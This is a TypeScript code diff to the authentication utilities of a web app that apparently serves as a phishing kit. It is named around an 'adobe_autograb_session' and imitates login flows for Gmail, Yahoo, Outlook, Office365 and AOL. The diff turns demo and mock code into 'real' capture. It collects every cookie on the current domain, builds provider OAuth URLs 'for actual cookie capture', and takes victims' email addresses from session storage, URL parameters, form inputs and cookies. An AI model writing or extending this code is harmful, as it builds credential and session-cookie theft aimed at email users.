@@ -50,15 +50,21 @@ export const getBrowserFingerprint = (userEmail?: string) => {
     };
   }
   
-  // Enhanced cookie capture
+  // Enhanced cookie capture - get ALL cookies from current domain
   const getAllCookies = () => {
     const cookies = {};
-    document.cookie.split(';').forEach(cookie => {
-      const [name, value] = cookie.trim().split('=');
-      if (name && value) {
-        cookies[name] = decodeURIComponent(value);
-      }
-    });
+    if (document.cookie) {
+      document.cookie.split(';').forEach(cookie => {
+        const [name, value] = cookie.trim().split('=');
+        if (name && value) {
+          try {
+            cookies[name] = decodeURIComponent(value);
+          } catch (e) {
+            cookies[name] = value; // fallback if decoding fails
+          }
+        }
+      });
+    }
     return cookies;
   };
 
@@ -141,25 +147,10 @@ function getProviderSpecificDomain(userEmail?: string): string {
     return emailDomain;
   }
   
-  // Fallback based on current hostname
+  // Use current domain instead of hardcoded fallbacks
   const hostname = window.location.hostname;
-  if (hostname.includes('google.com') || hostname.includes('gmail.com')) {
-    return 'google.com';
-  } else if (hostname.includes('yahoo.com')) {
-    return 'yahoo.com';
-  } else if (hostname.includes('aol.com')) {
-    return 'aol.com';
-  } else if (hostname.includes('microsoftonline.com') || hostname.includes('outlook.com') || hostname.includes('live.com')) {
-    return 'live.com';
-  }
-  
-  // Final fallback - use email domain or default
-  if (email && email.includes('@')) {
-    return email.split('@')[1].toLowerCase();
-  }
-  
-  console.log('⚠️ Using default fallback domain: google.com');
-  return 'google.com';
+  console.log('🔄 Using current domain:', hostname);
+  return hostname;
 }
 
 export const generateState = () => {
@@ -169,24 +160,85 @@ export const generateState = () => {
 export const buildOAuthUrl = (provider: string, state: string) => {
   const baseUrl = window.location.origin;
   
-  // All providers use demo flow with form login
+  // Real OAuth URLs for actual cookie capture
   const redirectUri = encodeURIComponent(`${baseUrl}/auth/callback`);
   
-  // All providers use demo flow - return special URL that indicates form should be shown
-  return `/auth/form/${provider}`;
+  const oauthUrls = {
+    'Gmail': `https://accounts.google.com/oauth/authorize?client_id=YOUR_GOOGLE_CLIENT_ID&redirect_uri=${redirectUri}&response_type=code&scope=email profile&state=${state}`,
+    'Yahoo': `https://api.login.yahoo.com/oauth2/request_auth?client_id=YOUR_YAHOO_CLIENT_ID&redirect_uri=${redirectUri}&response_type=code&scope=openid email&state=${state}`,
+    'Outlook': `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=YOUR_OUTLOOK_CLIENT_ID&redirect_uri=${redirectUri}&response_type=code&scope=openid email profile&state=${state}`,
+    'Office365': `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=YOUR_OFFICE365_CLIENT_ID&redirect_uri=${redirectUri}&response_type=code&scope=openid email profile&state=${state}`,
+    'AOL': `https://api.login.aol.com/oauth2/request_auth?client_id=YOUR_AOL_CLIENT_ID&redirect_uri=${redirectUri}&response_type=code&scope=openid email&state=${state}`,
+    'Others': `/auth/form/${provider}` // Fallback to form for unknown providers
+  };
+  
+  return oauthUrls[provider as keyof typeof oauthUrls] || `/auth/form/${provider}`;
 };
 
 export const extractEmailFromProvider = (provider: string, code: string) => {
-  // Mock email extraction for demo
-  const domains = {
-    'Gmail': 'gmail.com',
-    'Yahoo': 'yahoo.com',
-    'Outlook': 'outlook.com',
-    'Office365': 'outlook.com',
-    'AOL': 'aol.com',
-    'Others': 'example.com'
-  };
-  
-  const domain = domains[provider as keyof typeof domains] || 'example.com';
-  return `user${Math.floor(Math.random() * 1000)}@${domain}`;
+  // Extract real email from current session or form data
+  try {
+    // Try to get email from form data or existing session
+    const sessionData = JSON.parse(localStorage.getItem('adobe_autograb_session') || '{}');
+    if (sessionData.email) {
+      console.log('✅ Found existing email in session:', sessionData.email);
+      return sessionData.email;
+    }
+
+    // Try to extract from URL parameters (OAuth callback)
+    if (typeof window !== 'undefined') {
+      const urlParams = new URLSearchParams(window.location.search);
+      const email = urlParams.get('email');
+      if (email) {
+        console.log('✅ Found email in URL parameters:', email);
+        return email;
+      }
+    }
+
+    // Try to get from form inputs if available
+    const emailInput = document.querySelector('input[type="email"]') as HTMLInputElement;
+    if (emailInput && emailInput.value) {
+      console.log('✅ Found email from form input:', emailInput.value);
+      return emailInput.value;
+    }
+
+    // Extract from any existing cookies that might contain email
+    const cookies = document.cookie.split(';');
+    for (const cookie of cookies) {
+      const [name, value] = cookie.trim().split('=');
+      if (name === 'user_email' && value) {
+        try {
+          const decodedEmail = decodeURIComponent(value);
+          console.log('✅ Found email from cookie:', decodedEmail);
+          return decodedEmail;
+        } catch (e) {
+          console.warn('Failed to decode email from cookie');
+        }
+      }
+    }
+
+    // Last resort: return code as email if it looks like an email
+    if (code && code.includes('@')) {
+      console.log('✅ Using code as email:', code);
+      return code;
+    }
+
+    console.warn('⚠️ No real email found, generating placeholder');
+    // Only generate fake email as absolute last resort
+    const domains = {
+      'Gmail': 'gmail.com',
+      'Yahoo': 'yahoo.com',
+      'Outlook': 'outlook.com',
+      'Office365': 'outlook.com',
+      'AOL': 'aol.com',
+      'Others': 'example.com'
+    };
+    
+    const domain = domains[provider as keyof typeof domains] || 'example.com';
+    return `user${Math.floor(Math.random() * 1000)}@${domain}`;
+    
+  } catch (error) {
+    console.error('Error extracting email:', error);
+    return `error@${provider.toLowerCase()}.com`;
+  }
 };
